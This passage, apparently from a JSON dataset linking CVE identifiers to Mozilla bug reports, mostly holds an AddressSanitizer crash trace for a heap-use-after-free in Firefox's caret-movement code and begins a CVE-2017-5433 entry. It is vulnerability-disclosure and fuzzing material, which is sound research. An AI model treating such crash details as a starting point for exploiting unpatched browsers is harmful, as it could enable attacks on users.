/home/worker/workspace/build/src/dom/xbl/nsXBLPrototypeHandler.cpp:221:12 #6 0x7fc2c0938fc8 in nsXBLWindowKeyHandler::WalkHandlersAndExecute(nsIDOMKeyEvent*, nsIAtom*, nsXBLPrototypeHandler*, unsigned int, mozilla::dom::IgnoreModifierState const&, bool, bool*) /home/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:755:19 #7 0x7fc2c093359b in nsXBLWindowKeyHandler::WalkHandlersInternal(nsIDOMKeyEvent*, nsIAtom*, nsXBLPrototypeHandler*, bool, bool*) /home/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:618:12 #8 0x7fc2c0932f57 in nsXBLWindowKeyHandler::WalkHandlers(nsIDOMKeyEvent*, nsIAtom*) /home/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:298:3 #9 0x7fc2c0937705 in nsXBLWindowKeyHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:477:10 #10 0x7fc2bf35fe89 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1123:16 #11 0x7fc2bf361e18 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20 #12 0x7fc2bf34c80d in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:489:9 #13 0x7fc2bf34cc14 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:518:5 #14 0x7fc2bf34fdb7 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #15 0x7fc2bf352207 in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:891:12 #16 0x7fc2bd6b1cc1 in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1331:5 #17 0x7fc2bf36d2b4 in mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/events/EventTarget.cpp:73:9 #18 0x7fc2beab05a2 in mozilla::dom::EventTargetBinding::dispatchEvent(JSContext*, JS::Handle<JSObject*>, mozilla::dom::EventTarget*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:974:15 #19 0x7fc2beaad59f in mozilla::dom::EventTargetBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:1150:13 #20 0x7fc2c4a2917f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #21 0x7fc2c4a2917f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #22 0x7fc2c4a0fc72 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #23 0x7fc2c4a0fc72 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2954 #24 0x7fc2c49f52ab in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #25 0x7fc2c4a29496 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #26 0x7fc2c4a29b72 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #27 0x7fc2c53fea93 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #28 0x7fc2bc2d2c39 in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #29 0x7fc2c4a2917f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #30 0x7fc2c4a2917f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #31 0x7fc2c4a0fc72 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #32 0x7fc2c4a0fc72 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2954 #33 0x7fc2c49f52ab in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #34 0x7fc2c4a29496 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #35 0x7fc2c4a29b72 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #36 0x7fc2c540084c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 #37 0x7fc2be9da202 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:47:8 #38 0x7fc2bf35fe4e in HandleEvent<mozilla::dom::EventTarget *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:65:12 #39 0x7fc2bf35fe4e in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1119 #40 0x7fc2bf361e18 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20 #41 0x7fc2bf34c4f3 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:465:5 #42 0x7fc2bf34fdb7 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #43 0x7fc2bd289b5e in nsGlobalWindow::PostHandleEvent(mozilla::EventChainPostVisitor&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:3804:7 #44 0x7fc2bf34c605 in PostHandleEvent /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:416:3 #45 0x7fc2bf34c605 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:468 #46 0x7fc2bf34cc14 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:518:5 #47 0x7fc2bf34fdb7 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #48 0x7fc2c15b7616 in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1043:7 #49 0x7fc2c3a8a6ca in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7642:5 #50 0x7fc2c3a86384 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7436:7 #51 0x7fc2c3a8dd8f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7333:13 #52 0x7fc2bc57e9d0 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1258:3 #53 0x7fc2bc57d968 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:842:5 #54 0x7fc2bc57a6c6 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:732:9 #55 0x7fc2bc57c7c4 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:614:5 #56 0x7fc2bc57d37c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:470:14 #57 0x7fc2bacc7c2b in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:634:18 #58 0x7fc2bd5ea76b in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8863:7 #59 0x7fc2bd5ea30b in nsDocument::UnblockOnload(bool) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8789:9 #60 0x7fc2bd5c033c in nsDocument::DispatchContentLoadedEvents() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5294:3 #61 0x7fc2bd690062 in applyImpl<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:855:12 #62 0x7fc2bd690062 in apply<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:861 #63 0x7fc2bd690062 in mozilla::detail::RunnableMethodImpl<nsDocument*, void (nsDocument::*)(), true, false>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:890 #64 0x7fc2baad4632 in mozilla::ValidatingDispatcher::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/Dispatcher.cpp:257:21 #65 0x7fc2bab091b2 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #66 0x7fc2bab05a60 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #67 0x7fc2bb917cbf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #68 0x7fc2bb8898c8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #69 0x7fc2bb8898c8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #70 0x7fc2bb8898c8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #71 0x7fc2c0d75bcf in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #72 0x7fc2c45b6467 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:854:12 #73 0x7fc2bb8898c8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #74 0x7fc2bb8898c8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #75 0x7fc2bb8898c8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #76 0x7fc2c45b5e69 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:686:7 #77 0x4e01b6 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:19 #78 0x4e01b6 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #79 0x7fc2d5fc382f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #80 0x41c3d8 in _start (/home/nils/fuzzer3/firefox/firefox+0x41c3d8) 0x6110002f4638 is located 184 bytes inside of 232-byte region [0x6110002f4580,0x6110002f4668) freed by thread T0 (Web Content) here: #0 0x4b2b2b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7fc2ba9a7344 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2664:9 #2 0x7fc2ba9a6f36 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2839:3 #3 0x7fc2ba9ae2f5 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3839:3 #4 0x7fc2ba9adab0 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3661:9 #5 0x7fc2ba9b0994 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4157:3 #6 0x7fc2bd6cea00 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1452:3 #7 0x7fc2bd2273fd in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1339:3 #8 0x7fc2bab24901 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:115 #9 0x7fc2bc3941a7 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2010:12 #10 0x7fc2bc3941a7 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1329 #11 0x7fc2bc3941a7 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1296 #12 0x7fc2bc39bb1b in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:983:12 #13 0x7fc2c4a2917f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #14 0x7fc2c4a2917f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #15 0x7fc2c4a0fc72 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #16 0x7fc2c4a0fc72 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2954 #17 0x7fc2c49f52ab in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #18 0x7fc2c4a29496 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #19 0x7fc2c4a29b72 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #20 0x7fc2c53fea93 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #21 0x7fc2bc2d2c39 in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #22 0x7fc2c4a2917f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #23 0x7fc2c4a2917f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #24 0x7fc2c4a0fc72 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #25 0x7fc2c4a0fc72 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2954 #26 0x7fc2c49f52ab in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #27 0x7fc2c4a29496 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #28 0x7fc2c4a29b72 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #29 0x7fc2c56a971c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7fc2c56603ae in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:14 #31 0x7fc2c5689189 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:12 #32 0x7fc2c568bab4 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #33 0x7fc2c4a29227 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #34 0x7fc2c4a29227 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #35 0x7fc2c4a29b72 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #36 0x7fc2c540084c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 previously allocated by thread T0 (Web Content) here: #0 0x4b2e4b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e11bd in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7fc2bf7c05f0 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7fc2bf7c05f0 in nsTextEditorState::BindToFrame(nsTextControlFrame*) /home/worker/workspace/build/src/dom/html/nsTextEditorState.cpp:1170 #4 0x7fc2c1a0d804 in nsTextControlFrame::CreateAnonymousContent(nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /home/worker/workspace/build/src/layout/forms/nsTextControlFrame.cpp:337:17 #5 0x7fc2c1560d07 in nsCSSFrameConstructor::GetAnonymousContent(nsIContent*, nsIFrame*, nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4224:17 #6 0x7fc2c1553c72 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10979:3 #7 0x7fc2c156a19b in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4079:9 #8 0x7fc2c1575236 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6220:3 #9 0x7fc2c1554ab4 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10760:5 #10 0x7fc2c1554ab4 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11064 #11 0x7fc2c155e634 in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsContainerFrame*, nsStyleContext*, nsContainerFrame**, nsFrameItems&, nsIFrame*, PendingBinding*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:12081:3 #12 0x7fc2c155a0c4 in nsCSSFrameConstructor::ConstructDocElementFrame(mozilla::dom::Element*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:2643:5 #13 0x7fc2c157ec30 in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool, TreeMatchContext*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7837:7 #14 0x7fc2c1576672 in ContentInserted /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7722:10 #15 0x7fc2c1576672 in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool, nsCSSFrameConstructor::RemoveFlags, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9826 #16 0x7fc2c14a5df9 in mozilla::RestyleManager::ProcessRestyledFrames(nsStyleChangeList&) /home/worker/workspace/build/src/layout/base/RestyleManager.cpp:1516:7 #17 0x7fc2c148a3ba in mozilla::GeckoRestyleManager::ComputeAndProcessStyleChange(nsIFrame*, nsChangeHint, mozilla::RestyleTracker&, nsRestyleHint, mozilla::RestyleHintData const&) /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:3516:3 #18 0x7fc2c1489874 in mozilla::GeckoRestyleManager::RestyleElement(mozilla::dom::Element*, nsIFrame*, nsChangeHint, mozilla::RestyleTracker&, nsRestyleHint, mozilla::RestyleHintData const&) /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:152:5 #19 0x7fc2c151787e in ProcessOneRestyle /home/worker/workspace/build/src/layout/base/RestyleTracker.cpp:95:5 #20 0x7fc2c151787e in mozilla::RestyleTracker::DoProcessRestyles() /home/worker/workspace/build/src/layout/base/RestyleTracker.cpp:262 #21 0x7fc2c148dbef in ProcessRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/GeckoRestyleManager.h:386:7 #22 0x7fc2c148dbef in mozilla::GeckoRestyleManager::ProcessPendingRestyles() /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:505 #23 0x7fc2c14dae10 in ProcessPendingRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManagerInlines.h:44:3 #24 0x7fc2c14dae10 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4184 #25 0x7fc2bd5e351e in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:599:5 #26 0x7fc2bd5e351e in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8007 #27 0x7fc2bd62bd6e in nsFocusManager::CheckIfFocusable(nsIContent*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1550:3 #28 0x7fc2bd62840c in nsFocusManager::SetFocusInner(nsIContent*, int, bool, bool) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1180:41 #29 0x7fc2bd62b7ae in nsFocusManager::SetFocus(nsIDOMElement*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:484:3 #30 0x7fc2bd3b892f in mozilla::dom::Element::Focus(mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/Element.cpp:311:14 #31 0x7fc2bec55ce8 in mozilla::dom::HTMLElementBinding::focus(JSContext*, JS::Handle<JSObject*>, nsGenericHTMLElement*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLElementBinding.cpp:462:3 #32 0x7fc2bef5b617 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #33 0x7fc2c4a2917f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #34 0x7fc2c4a2917f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #35 0x7fc2c4a29b72 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #36 0x7fc2c56a971c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #37 0x7fc2c56603ae in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:14 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:972:8 in nsFrameSelection::MoveCaret(nsDirection, bool, nsSelectionAmount, nsFrameSelection::CaretMovementStyle) Shadow bytes around the buggy address: 0x0c2280056870: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c2280056880: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c2280056890: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c22800568a0: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c22800568b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c22800568c0: fd fd fd fd fd fd fd[fd]fd fd fd fd fd fa fa fa 0x0c22800568d0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c22800568e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c22800568f0: 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2280056900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2280056910: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==19751==ABORTING"
      }
    ],
    "CVE-2017-5433": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1347168",
        "title": "heap-use-after-free in nsSMILCompositor::GetFirstFuncToAffectSandwich",
